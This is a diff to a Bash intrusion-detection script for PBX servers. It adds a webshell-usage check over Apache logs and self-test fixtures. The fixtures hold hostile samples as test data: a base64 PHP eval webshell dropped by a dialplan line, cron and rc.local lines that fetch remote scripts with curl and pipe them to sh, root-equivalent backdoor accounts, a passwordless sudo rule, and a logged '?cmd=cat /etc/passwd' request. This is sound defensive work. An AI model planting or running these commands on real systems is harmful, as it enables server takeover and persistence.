@@ -740,7 +740,26 @@ check_botnet() {
   [ -n "$p" ] && persist_alert "botnet|proc" "processo de varredura/ataque SIP em execucao neste servidor: $(echo "$p" | cut -c1-120)"
 }
 
-host_checks() { check_firewall; check_fail2ban; check_dialplan; check_dialplan_injection; check_cron; check_framework; check_persistence; check_immutable; check_botnet; }
+# Webshell em uso: requisicao a um .php com parametro de comando (?cmd=, ?exec= ...), tipico de quem testa/usa uma
+# webshell plantada. Avisa na hora (alerta unico por IP+arquivo). So le o log do Apache, nao altera nada.
+check_webshell_hits() {
+  [ "${DIGEST_MODE:-0}" = "1" ] && return 0
+  local l hit ip path code n=0
+  for l in ${SENTINEL_ACCESS_LOGS:-/var/log/httpd/access_log /var/log/httpd/ssl_access_log /var/log/apache2/access.log}; do
+    [ -r "$l" ] || continue
+    while read -r hit; do
+      [ -n "$hit" ] || continue
+      ip="${hit%% *}"; path="$(printf '%s' "$hit" | sed -E 's/.*"(GET|POST|HEAD) ([^ ?]+).*/\2/')"
+      code="$(printf '%s' "$hit" | sed -E 's/.*" ([0-9]{3}) .*/\1/')"
+      seen_once "webshell|$ip|$path" || continue
+      n=$((n+1)); [ "$n" -le 3 ] || continue
+      log "WEBSHELL em uso: $ip $path ($code)"
+      send_telegram "ALERTA: WEBSHELL EM USO"$'\n'"IP $ip acessou $path com parametro de comando (resposta $code$([ "$code" = 200 ] && echo ', o arquivo EXECUTOU')):"$'\n'"$(printf '%s' "$hit" | cut -c1-200)"$'\n\n'"Isole o arquivo (ipbx-sentinel --scan), troque as senhas e rode ipbx-sentinel --audit. Se a resposta foi 200, o invasor ja executa comandos."
+    done < <(tail -n 3000 "$l" 2>/dev/null | grep -aE '"(GET|POST) [^"]*\.php\?(cmd|exec|shell|command|system|passthru)=')
+  done
+}
+
+host_checks() { check_firewall; check_fail2ban; check_dialplan; check_dialplan_injection; check_webshell_hits; check_cron; check_framework; check_persistence; check_immutable; check_botnet; }
 
 do_scan() {
   local mode="$1"
@@ -875,19 +894,20 @@ cmd_selftest() {
   printf '#!/bin/bash\ncase "$1" in is-enabled) exit 0;; is-active) echo inactive; exit 3;; *) exit 0;; esac\n' > "$T/bin/systemctl"; chmod +x "$T/bin/systemctl"
   echo 'exten => s,1,Goto(thanku-outcall,s,1)' > "$T/extensions_custom.conf"
   printf 'exten => s,n,System(/var/lib/asterisk/bin/one_touch_record.php ${CHANNEL(name)})\n[injection-1]\nexten => s559368,1,System(echo PD9waHAgQGV2YWwoJF9QT1NUWzBdKTs/Pg== | base64 -d > /var/www/html/x.php)\n' > "$T/extensions_additional.conf"
+  printf '200.150.126.174 - - [05/Nov/2026:08:52:07 -0300] "GET /PBX.php?cmd=cat%%20/etc/passwd HTTP/1.1" 200 1884\n' > "$T/access_log"
   echo '* * * * * curl http://exemplo.invalido/x | sh' > "$T/cron/asterisk"
   printf 'root:x:0:0:root:/root:/bin/bash\nyum:x:0:0::/home/yum:/bin/bash\nabort:x:0:0::/:/bin/bash\nasterisk:x:100:100::/:/bin/bash\n' > "$T/passwd"
   printf '#!/bin/bash\n/usr/local/sbin/motd.sh > /etc/motd\nbash -c "curl -ks http://203.0.113.9/r/postroot.sh|bash"\n' > "$T/rc.local"
   printf 'asterisk ALL = NOPASSWD: /sbin/service\nasterisk ALL=(ALL) NOPASSWD: ALL\n' > "$T/sudoers"
   mkdir -p "$T/botdir"
   printf '#!/bin/bash\nprintf -- "----i---------e-- %%s\\n" "$2"\n' > "$T/bin/lsattr"; chmod +x "$T/bin/lsattr"
-  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" SENTINEL_PASSWD="$T/passwd" SENTINEL_RCLOCAL="$T/rc.local" SENTINEL_SUDOERS="$T/sudoers" SENTINEL_ATTR_FILES="$T/passwd" SENTINEL_BOTNET_DIRS="$T/botdir" "$0" --scan >/dev/null 2>&1 )
+  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" SENTINEL_PASSWD="$T/passwd" SENTINEL_RCLOCAL="$T/rc.local" SENTINEL_SUDOERS="$T/sudoers" SENTINEL_ATTR_FILES="$T/passwd" SENTINEL_BOTNET_DIRS="$T/botdir" SENTINEL_ACCESS_LOGS="$T/access_log" "$0" --scan >/dev/null 2>&1 )
   ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" SENTINEL_PASSWD="$T/passwd" SENTINEL_RCLOCAL="$T/rc.local" SENTINEL_SUDOERS="$T/sudoers" SENTINEL_ATTR_FILES="$T/passwd" SENTINEL_BOTNET_DIRS="$T/botdir" "$0" --digest >/dev/null 2>&1 )
   chk() { if [ "$2" = "gone" ] && [ ! -e "$1" ]; then ok=$((ok+1)); elif [ "$2" = "kept" ] && [ -e "$1" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: $1 deveria estar '$2'"; fi; }
   chk "$T/web/modules/a_emad.php" gone;  chk "$T/web/modules/b_chain.php" gone;  chk "$T/web/modules/c_decode.php" gone
   chk "$T/web/images/d_static.php" gone; chk "$T/web/admin/modules/phones" gone
   chk "$T/web/modules/legitimo.php" kept; chk "$T/web/admin/libraries/php-upgrade/compat.php" kept; chk "$T/web/admin/modules/core/XML_Unserializer.php" kept
-  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "DIALPLAN injecao" "CRON suspeito" "FRAMEWORK vulneravel" "PERSISTENCIA: usuario com poderes de root alem do root: yum" "PERSISTENCIA: usuario com poderes de root alem do root: abort" "baixa e executa script remoto a cada boot" "sudo SEM SENHA para qualquer comando" "PROTEGIDO contra alteracao" "ferramenta de ataque SIP" "RESUMO DIARIO:"; do
+  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "DIALPLAN injecao" "CRON suspeito" "FRAMEWORK vulneravel" "PERSISTENCIA: usuario com poderes de root alem do root: yum" "PERSISTENCIA: usuario com poderes de root alem do root: abort" "baixa e executa script remoto a cada boot" "sudo SEM SENHA para qualquer comando" "PROTEGIDO contra alteracao" "ferramenta de ataque SIP" "WEBSHELL em uso: 200.150.126.174" "RESUMO DIARIO:"; do
     if grep -qF "$k" "$T/log"; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: alerta '$k' nao gerado"; fi
   done
   rm -rf "$T"
